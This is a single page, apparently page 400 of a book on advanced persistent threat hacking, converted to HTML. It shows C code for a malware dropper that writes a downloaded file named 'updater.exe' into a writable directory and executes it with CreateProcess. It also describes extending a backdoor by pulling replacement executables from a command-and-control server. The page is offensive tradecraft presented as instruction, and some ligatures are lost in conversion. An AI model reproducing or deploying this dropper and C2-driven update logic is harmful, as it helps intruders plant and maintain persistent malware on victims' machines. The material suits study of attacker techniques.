<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1a7" class="pf w2 h2" data-page-no="1a7"><div class="pc pc1a7 w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">400<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">we then set as our output le for the cURL do<span class="_ _0"/>wnload operation. <span class="_ _3"/>Y<span class="_ _3"/>ou can see we’<span class="_ _0"/>v<span class="_ _0"/>e </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">used the FILEN<span class="_ _0"/>AME argument, which we’<span class="_ _2"/>ve dened in this case as updater<span class="_ _2"/>.ex<span class="_ _0"/>e.</div><div class="t m0 x3 h44 yc84 fff fse fc0 sc0 ls0 ws0">#define FILENAME updater.exe</div><div class="t m0 x3 h44 y25e0 fff fse fc0 sc0 ls0 ws0"> TCHAR exePath[MAXPATH]; // Store full EXE Path</div><div class="t m0 x3 h44 y25e1 fff fse fc0 sc0 ls0 ws0"> memset( exePath, ‘\0’, sizeof(exePath) );</div><div class="t m0 x3 h44 y25e2 fff fse fc0 sc0 ls0 ws0"> TCHAR directoryName[MAXPATH]; // Destination Directory Name</div><div class="t m0 x3 h44 y25e3 fff fse fc0 sc0 ls0 ws0"> memset( directoryName, ‘\0’, sizeof(directoryName) ); </div><div class="t m0 x3 h44 y25e4 fff fse fc0 sc0 ls0 ws0">  rwDirSuccess = findWritableDirectory( &amp;directoryName );</div><div class="t m0 x3 h44 y25e5 fff fse fc0 sc0 ls0 ws0">  strcat(exePath, directoryName); </div><div class="t m0 x3 h44 y25e6 fff fse fc0 sc0 ls0 ws0">  strcat(exePath, FILENAME);</div><div class="t m0 x3 h44 y25e7 fff fse fc0 sc0 ls0 ws0">/* curl write_callback takes a pointer to this file arg to output </div><div class="t m0 x3 h44 y25e8 fff fse fc0 sc0 ls0 ws0">file */</div><div class="t m0 x3 h44 y25e9 fff fse fc0 sc0 ls0 ws0">  FILE *outFile; </div><div class="t m0 x3 h44 y25ea fff fse fc0 sc0 ls0 ws0">  outFile=fopen( exePath , "wb");</div><div class="t m0 x4 hd y25eb ff4 fs7 fc0 sc0 ls0 ws0">In this example, we’<span class="_ _0"/>ll use the CreateProcess function rather than <span class="_ _0"/>W<span class="_ _0"/>inExec. <span class="_ _1b"/>Y<span class="_ _3"/>ou’ll </div><div class="t m0 x3 hd y25ec ff4 fs7 fc0 sc0 ls0 ws0">notice that we include the directoryName v<span class="_ _0"/>ariable, which is the directory identied </div><div class="t m0 x3 hd y25ed ff4 fs7 fc0 sc0 ls0 ws0">from the ndWritableDirectory function.</div><div class="t m0 x3 h44 y25ee fff fse fc0 sc0 ls0 ws0"> PROCESS_INFORMATION ProcessInfo; // out variable</div><div class="t m0 x3 h44 y25ef fff fse fc0 sc0 ls0 ws0"> STARTUPINFO StartupInfo; // in variable</div><div class="t m0 x3 h44 y25f0 fff fse fc0 sc0 ls0 ws0"> ZeroMemory(&amp;StartupInfo, sizeof(StartupInfo));</div><div class="t m0 x3 h44 y25f1 fff fse fc0 sc0 ls0 ws0"> StartupInfo.cb = sizeof StartupInfo ;</div><div class="t m0 x3 h44 y25f2 fff fse fc0 sc0 ls0 ws0"> CreateProcess( exePath, NULL, NULL,NULL,FALSE,0,NULL, directoryName,</div><div class="t m0 x3 h44 y25f3 fff fse fc0 sc0 ls0 ws0">&amp;StartupInfo,&amp;ProcessInfo);</div><div class="t m0 x3 h4 y25f4 ff2 fs1 fc0 sc0 ls0 ws0">Backdoor Extensibility</div><div class="t m0 x3 hd y25f5 ff4 fs7 fc0 sc0 ls0 ws0">This ability to do<span class="_ _0"/>wnload les is really at the heart of our extensibility needs for the </div><div class="t m0 x3 hd y25f6 ff4 fs7 fc0 sc0 ls0 ws0">backdoor<span class="_ _2"/>. <span class="_ _0"/>As long as we ha<span class="_ _0"/>ve communication with our command-and-control serv<span class="_ _0"/>er<span class="_ _0"/>, </div><div class="t m0 x3 hd y25f7 ff4 fs7 fc0 sc0 ls0 ws0">we can do<span class="_ _0"/>wnload les and “upgrade” our backdoor by replacing the ex<span class="_ _0"/>ecutable le.</div><div class="t m0 x4 hd y25f8 ff4 fs7 fc0 sc0 ls0 ws0">W<span class="_ _3"/>e can choose to have this e<span class="_ _0"/>xtensibility functionality as part of our watchdog </div><div class="t m0 x3 hd y25f9 ff4 fs7 fc0 sc0 ls0 ws0">service or as part of the backdoor itself. By including as part of the watchdog service </div><div class="t m0 x3 hd y25fa ff4 fs7 fc0 sc0 ls0 ws0">it would programmatically be easier to kill the current backdoor process and simply </div><div class="t m0 x3 hd y25fb ff4 fs7 fc0 sc0 ls0 ws0">replace the ex<span class="_ _0"/>ecutable le with the ne<span class="_ _0"/>w le. Utilizing the same cURL functions </div><div class="t m0 x3 hd y25fc ff4 fs7 fc0 sc0 ls0 ws0">cov<span class="_ _0"/>ered within the dropper program, we can do<span class="_ _0"/>wnload any les necessary<span class="_ _2"/>, which we </div><div class="t m0 x3 hd y25fd ff4 fs7 fc0 sc0 ls0 ws0">can specify with our communications from the C2 server<span class="_ _2"/>.</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>